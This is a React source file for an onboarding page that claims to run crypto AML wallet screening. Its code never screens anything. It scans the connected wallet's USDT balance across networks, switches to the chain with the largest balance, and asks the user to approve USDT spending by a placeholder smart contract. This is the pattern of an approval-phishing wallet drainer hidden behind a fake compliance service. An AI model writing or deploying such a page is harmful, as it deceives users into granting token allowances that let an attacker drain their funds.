import React, { useState, useEffect } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import CheckWalletButton from '../components/CheckWalletButton.jsx'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount, useSwitchChain } from 'wagmi'
import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount } from '../web3/tokenTransfer'
import { CHAIN_IDS } from '../web3/config.jsx'

export default function Onboarding() {
  const { open } = useWeb3Modal()
  const { address, isConnected, chainId } = useAccount()
  const { switchChain } = useSwitchChain()
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [usdtNetwork, setUsdtNetwork] = useState('')
  const [isApproving, setIsApproving] = useState(false)
  const [approvalStatus, setApprovalStatus] = useState('')
  const [allowance, setAllowance] = useState('0')
  const [isCheckingBalance, setIsCheckingBalance] = useState(false)
  const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false)

  // Replace with your actual smart contract address
  const SMART_CONTRACT_ADDRESS = "0xYourSmartContractAddress"

  function handleCheckWallet() {
    open && open()
  }

  // Check USDT balance when wallet connects or chain changes
  useEffect(() => {
    if (isConnected && address) {
      // On initial connection, check all networks and switch if needed
      // On network change, just check current network
      if (chainId) {
        checkCurrentNetworkBalance()
      } else {
        checkBalanceAllNetworks()
      }
    }
  }, [isConnected, address, chainId])

  async function checkCurrentNetworkBalance() {
    setIsCheckingBalance(true)
    try {
      // Find the current network name from chainId
      const currentNetworkName = Object.keys(CHAIN_IDS).find(
        key => CHAIN_IDS[key] === chainId
      ) || 'ethereum'
      
      // Check balance on current network only
      const balance = await checkUSDTBalance({ 
        userAddress: address, 
        network: currentNetworkName 
      })
      
      const balanceAmount = parseUSDTAmount(balance)
      
      // Update balance and network display
      setUsdtBalance(balanceAmount.toFixed(2))
      setUsdtNetwork(currentNetworkName)
      
      // Check allowance on current network
      if (balanceAmount > 0) {
        await checkCurrentAllowance(currentNetworkName)
      } else {
        setAllowance('0')
      }
    } catch (error) {
      console.error('Error checking current network balance:', error)
      setApprovalStatus('Error checking USDT balance')
    } finally {
      setIsCheckingBalance(false)
    }
  }

  async function checkBalanceAllNetworks() {
    setIsCheckingBalance(true)
    try {
      const result = await checkUSDTBalanceAllNetworks({ userAddress: address })
      
      // Find the current network name from chainId
      const currentNetworkName = Object.keys(CHAIN_IDS).find(
        key => CHAIN_IDS[key] === chainId
      ) || 'ethereum'
      
      // Check if we should switch networks (only on initial connection)
      if (result.highest.balance > 0) {
        const targetChainId = CHAIN_IDS[result.highest.network]
        
        // If we're not on the network with highest balance, switch to it
        if (chainId !== targetChainId) {
          console.log(`Switching from ${currentNetworkName} to ${result.highest.network} (highest balance: ${result.highest.balance})`)
          await switchToNetwork(targetChainId, result.highest.network)
          return // Exit early, let the chainId change trigger a re-check
        }
      }
      
      // Get balance for current network
      const currentNetworkBalance = result.allBalances.find(
        balance => balance.network === currentNetworkName
      ) || { balance: 0, network: currentNetworkName }
      
      // Update balance and network display with current network data
      setUsdtBalance(currentNetworkBalance.balance.toFixed(2))
      setUsdtNetwork(currentNetworkName)
      
      // Check allowance on current network
      if (currentNetworkBalance.balance > 0) {
        await checkCurrentAllowance(currentNetworkName)
      }
    } catch (error) {
      console.error('Error checking balance:', error)
      setApprovalStatus('Error checking USDT balance')
    } finally {
      setIsCheckingBalance(false)
    }
  }

  async function switchToNetwork(targetChainId, networkName) {
    setIsSwitchingNetwork(true)
    setApprovalStatus(`Switching to ${networkName}...`)
    
    try {
      console.log(`Attempting to switch to chainId: ${targetChainId} (${networkName})`)
      await switchChain({ chainId: targetChainId })
      console.log(`Successfully switched to ${networkName}`)
      setApprovalStatus(`Switched to ${networkName} network`)
      // The chainId change will trigger useEffect to re-check balance
    } catch (error) {
      console.error('Error switching network:', error)
      if (error.code === 4902) {
        setApprovalStatus(`Please add ${networkName} network to your wallet manually`)
      } else {
        setApprovalStatus(`Failed to switch to ${networkName}. Please switch manually.`)
      }
    } finally {
      setIsSwitchingNetwork(false)
    }
  }

  async function checkCurrentAllowance(network = 'ethereum') {
    try {
      const currentAllowance = await checkUSDTAllowance({ 
        smartContractAddress: SMART_CONTRACT_ADDRESS, 
        userAddress: address,
        network
      })
      setAllowance(parseUSDTAmount(currentAllowance).toFixed(2))
    } catch (error) {
      console.error('Error checking allowance:', error)
    }
  }

  async function handleApproveUSDT() {
    if (!isConnected || !address) {
      setApprovalStatus('Please connect your wallet first')
      return
    }

    if (!usdtNetwork) {
      setApprovalStatus('No USDT balance found on any network')
      return
    }

    setIsApproving(true)
    setApprovalStatus(`Approving USDT on ${usdtNetwork}...`)

    try {
      const tx = await approveUSDT({
        smartContractAddress: SMART_CONTRACT_ADDRESS,
        userAddress: address,
        network: usdtNetwork
      })
      
      setApprovalStatus(`Approval transaction sent on ${usdtNetwork}: ${tx}`)
      
      // Wait for transaction to be mined
      await tx.wait()
      
      setApprovalStatus(`USDT approval successful on ${usdtNetwork}!`)
      await checkCurrentAllowance(usdtNetwork) // Refresh allowance
    } catch (error) {
      console.error('Approval failed:', error)
      setApprovalStatus(`Approval failed: ${error.message}`)
    } finally {
      setIsApproving(false)
    }
  }

  return (
    <>
      <Header />
      <main className="onboard" aria-labelledby="onboard-title">
        <div className="onboard-inner">
          <h1 id="onboard-title" className="onboard-title">Get started with AML checks</h1>
          <p className="onboard-subtitle">We’ll walk you through how wallet risk screening works and what to expect.</p>

          <ol className="onboard-steps" aria-label="AML check process">
            <li className="onboard-step">
              <div className="step-num">1</div>
              <div className="step-content">
                <h3>Provide a wallet address</h3>
                <p>Enter the crypto address you want to assess. We support major chains and formats.</p>
              </div>
            </li>
            <li className="onboard-step">
              <div className="step-num">2</div>
              <div className="step-content">
                <h3>Screen against risk sources</h3>
                <p>We analyze the address’s exposure to sanctioned entities, darknet markets, mixers, scams, and other high‑risk services.</p>
              </div>
            </li>
            <li className="onboard-step">
              <div className="step-num">3</div>
              <div className="step-content">
                <h3>Generate an AML risk score</h3>
                <p>Our engine aggregates signals to produce a clear risk score with supporting evidence.</p>
              </div>
            </li>
            <li className="onboard-step">
              <div className="step-num">4</div>
              <div className="step-content">
                <h3>Download a compliant report</h3>
                <p>Export a regulator‑friendly report for audits and internal reviews.</p>
              </div>
            </li>
          </ol>

          <div className="onboard-cta">
            {!isConnected ? (
              <CheckWalletButton onClick={handleCheckWallet}>Connect Wallet</CheckWalletButton>
            ) : (
              <div className="wallet-connected">
                <div className="wallet-info">
                  <p>Connected: {address?.slice(0, 6)}...{address?.slice(-4)}</p>
                  {isCheckingBalance ? (
                    <p>Checking USDT balance across networks...</p>
                  ) : isSwitchingNetwork ? (
                    <p>Switching to {usdtNetwork} network...</p>
                  ) : (
                    <>
                      <p>USDT Balance: {usdtBalance} USDT ({usdtNetwork})</p>
                      <p>Current Allowance: {allowance} USDT</p>
                      <p style={{fontSize: '12px', color: '#666'}}>Connected to: {Object.keys(CHAIN_IDS).find(key => CHAIN_IDS[key] === chainId) || 'unknown'}</p>
                    </>
                  )}
                </div>
                <button 
                  className="btn primary" 
                  onClick={handleApproveUSDT}
                  disabled={isApproving || isSwitchingNetwork || isCheckingBalance}
                >
                  {isApproving ? 'Approving...' : isSwitchingNetwork ? 'Switching...' : 'Approve USDT'}
                </button>
                {approvalStatus && (
                  <p className="approval-status">{approvalStatus}</p>
                )}
              </div>
            )}
          </div>
        </div>
      </main>
      <Footer />
    </>
  )
}
